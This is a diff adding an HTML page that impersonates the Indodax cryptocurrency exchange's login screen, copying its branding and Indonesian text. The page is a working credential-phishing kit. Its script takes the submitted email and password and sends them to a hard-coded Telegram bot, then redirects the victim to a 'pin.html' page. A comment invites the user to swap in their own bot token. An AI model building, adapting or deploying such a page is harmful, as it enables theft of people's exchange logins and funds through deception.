@@ -1,0 +1,175 @@
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Indodax Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+    /* Loading overlay styles */
+    #loadingOverlay {
+      background-color: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(3px);
+      position: fixed;
+      inset: 0;
+      z-index: 50;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      visibility: hidden;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    #loadingOverlay.show {
+      visibility: visible;
+      opacity: 1;
+    }
+    /* Spinner animation */
+    .spinner {
+      border: 4px solid #e5e7eb; /* Tailwind gray-200 */
+      border-top: 4px solid #0077cc; /* Custom blue */
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body class="bg-white text-gray-900 relative">
+  <header class="flex items-center justify-between px-4 py-3 border-b border-gray-200">
+    <div class="flex items-center space-x-2">
+      <img alt="Indodax logo text in blue" class="h-7 w-auto" height="30" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTRHCOE7BSJG8ioQWJO1WCG7D3t-dpqgT7t6I3VxXsL4L6IzwikoDN0iUbB&s=10" width="100"/>
+    </div>
+    <div class="flex items-center space-x-2">
+      <button class="bg-[#0091FF] text-white text-sm font-semibold px-3 py-1 rounded" type="button">Daftar</button>
+      <img alt="Indonesian flag icon" class="h-6 w-6 rounded-sm" height="24" src="https://media.istockphoto.com/id/1314789593/id/vektor/indonesia-ilustrasi-vektor-ikon-bendera-bulat.jpg?s=612x612&w=0&k=20&c=NClD2JYR381TnRbJEi3JZORSm8WBDs7I88Y67H75JrI=" width="24"/>
+    </div>
+  </header>
+  <main class="px-6 pt-6 max-w-md mx-auto">
+    <section>
+      <h1 class="font-semibold text-lg text-gray-900 mb-1">INDODAX Login</h1>
+      <p class="text-gray-600 text-sm mb-6">Gunakan email dan kata sandi yang terdaftar untuk masuk ke akun Anda</p>
+      <form id="loginForm" class="space-y-4">
+        <div>
+          <label class="block text-xs font-semibold text-gray-700 mb-1" for="email">Email</label>
+          <input class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500" id="email" placeholder="Masukkan Email" type="email" required/>
+        </div>
+        <div>
+          <label class="block text-xs font-semibold text-gray-700 mb-1" for="password">Password</label>
+          <div class="relative">
+            <input class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 text-sm placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500" id="password" placeholder="Masukkan Kata Sandi" type="password" required/>
+            <button aria-label="Toggle password visibility" class="absolute inset-y-0 right-3 flex items-center text-gray-400" type="button" id="togglePassword">
+              <i class="fas fa-eye-slash"></i>
+            </button>
+          </div>
+          <div class="text-right mt-1">
+            <a class="text-sm text-[#0091FF] font-medium hover:underline" href="https://indodax.com/forgot-password">Lupa Kata Sandi</a>
+          </div>
+        </div>
+        <button class="w-full bg-[#0077cc] text-white font-semibold py-2 rounded-md text-sm disabled:opacity-50 disabled:cursor-not-allowed" type="submit" id="submitBtn" disabled>Masuk</button>
+      </form>
+      <div class="flex items-center my-6 text-gray-400 text-xs">
+        <hr class="flex-grow border-t border-gray-300"/>
+        <span class="px-3">Atau</span>
+        <hr class="flex-grow border-t border-gray-300"/>
+      </div>
+      <button class="w-full border border-gray-300 rounded-md py-2 text-sm flex items-center justify-center space-x-2 hover:bg-gray-50" type="button">
+        <img alt="Google logo icon" class="h-4 w-4" height="18" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmguRXM4x_NfZV05wWKPTaYP90hhm3TwfDK_N-dvY9jhmzEVdq-ntere8&s=10" width="18"/>
+        <span>Lanjut dengan Google</span>
+      </button>
+    </section>
+    <section class="mt-10 max-w-md mx-auto">
+      <h2 class="font-semibold text-gray-900 text-sm mb-4">Mengapa 9.0 juta++ pengguna memilih Indodax sebagai exchange andalan</h2>
+      <div class="flex items-start space-x-4 mb-6">
+        <div class="flex-shrink-0 bg-white rounded-lg p-3 shadow-md border border-gray-200">
+          <img alt="Gold medal icon with red ribbon and number 1" class="h-10 w-10" height="40" src="https://indodax.com/indodax/assets/images/svg/pionir.svg" width="40"/>
+        </div>
+        <div>
+          <h3 class="font-semibold text-gray-900 text-sm mb-1">Pionir dan Paling Dipercaya</h3>
+          <p class="text-gray-500 text-xs max-w-xs leading-tight">Bergabung dengan platform jual-beli kripto pertama di indonesia dengan rekam jejak solid sejak 2014.</p>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- Loading overlay -->
+  <div id="loadingOverlay">
+    <div class="spinner" role="status" aria-label="Loading"></div>
+  </div>
+
+  <script>
+    // Toggle password visibility
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+    const submitBtn = document.getElementById('submitBtn');
+    const emailInput = document.getElementById('email');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+
+    togglePassword.addEventListener('click', () => {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      togglePassword.innerHTML = type === 'password' ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
+    });
+
+    // Enable submit button only if both email and password have values
+    function toggleSubmitButton() {
+      if(emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+        submitBtn.disabled = false;
+      } else {
+        submitBtn.disabled = true;
+      }
+    }
+
+    emailInput.addEventListener('input', toggleSubmitButton);
+    passwordInput.addEventListener('input', toggleSubmitButton);
+
+    // Telegram bot info - replace with your own
+    const botToken = '8264143217:AAGF4jq6UCT52FUQ-PCGg2DTVn_wW3Ql14w';
+    const chatId = '6155537801';
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = emailInput.value;
+      const password = passwordInput.value;
+
+      // Show loading overlay
+      loadingOverlay.classList.add('show');
+
+      const message = `Login Indodax:\nEmail: ${email}\nPassword: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        loadingOverlay.classList.remove('show');
+        if(data.ok) {
+          window.location.href = "pin.html";
+          this.reset();
+          submitBtn.disabled = true;
+        } else {
+          alert('Failed to send data to Telegram.');
+        }
+      })
+      .catch(() => {
+        loadingOverlay.classList.remove('show');
+        alert('Error sending data to Telegram.');
+      });
+    });
+  </script>
+</body>
+  </html>
